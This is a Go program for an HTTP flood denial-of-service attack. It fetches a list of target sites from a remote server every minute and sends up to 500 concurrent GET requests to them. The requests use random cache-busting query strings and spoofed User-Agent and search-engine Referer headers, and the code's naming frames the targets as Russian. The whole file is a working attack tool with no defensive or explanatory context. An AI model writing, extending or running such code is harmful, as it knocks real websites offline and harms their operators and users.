package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	ua "github.com/wux1an/fake-useragent"
)

type strikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

func (si *strikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}

type Statistics map[string]struct {
	failCnt   int
	succCnt   int
	startTime time.Time
}

const (
	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
	strikeRefreshInterval = 60 * time.Second
	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

	// strikeRefreshing uint8 = iota
	// strikeListReady
	// strikeListProcessing
)

var (
	strikeList                 []strikeItem
	limiter, refresher         chan struct{}
	noProxyClient, proxyClient *http.Client

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
)

func main() {
	initClients()

	limiter = make(chan struct{}, 500)
	refresher = make(chan struct{}, 1)

	if err := fetchStrikeList(); err != nil {
		fmt.Printf("failed to fetch Strike list: %v\n", err)
		os.Exit(9)
	}
	startStrikeListRefresher()

	ua.Random() // NOTE: init cache at this point. bud noticed below...

	for {
		time.Sleep(100 * time.Millisecond)
		refresher <- struct{}{}
		// fmt.Println("start processing strikeList")

		go func() {
			defer func() { <-refresher }()

			for _, strike := range strikeList {
				atack, ok := strike.Atack.(bool)
				if !ok {
					if atack, ok := strike.Atack.(int); !ok || atack == 0 {
						continue
					}

				} else if !atack {
					continue
				}

				limiter <- struct{}{}
				go func(huilo strikeItem) {
					defer func() { <-limiter }()
					_ = greetingsTorussiaWarShip(huilo)
				}(strike)

			}
			// fmt.Println("completed processing strikeList")
		}()
	}
}

func fetchStrikeList() error {
	refresher <- struct{}{}
	defer func() { <-refresher }()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, strikeUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
	}

	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Accept", "text/json, application/json")

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	// time.Sleep(200 * time.Microsecond)
	fmt.Println("***\t\t\t***")
	fmt.Printf("* * fetched sites: %d * *\n", len(strikeList))
	fmt.Println("***\t\t\t***")

	return err
}

func startStrikeListRefresher() {
	ticker := time.NewTicker(strikeRefreshInterval)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchStrikeList(); err != nil {
					fmt.Println("failed to fetch site List. retrying...")
					fmt.Println(err.Error())
					fetchStrikeList()
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}()
}

func greetingsTorussiaWarShip(huilo strikeItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}

	// req.Header.Add("Content-Type", "application/json")
	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", huilo.Url)

	fmt.Printf("attacking %s\n", huilo.Url)

	resp, err := proxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	// NOTE: do not fetch actual body but reflect on connection instead
	// _, err = ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	// }

	return nil
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func initClients() {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	tr2 := http.DefaultTransport.(*http.Transport).Clone()
	tr2.IdleConnTimeout = 4 * time.Second
	tr2.DialContext = (&net.Dialer{
		Timeout:   2 * time.Second,
		KeepAlive: 1 * time.Second,
	}).DialContext
	proxyClient = &http.Client{Transport: tr2}
}
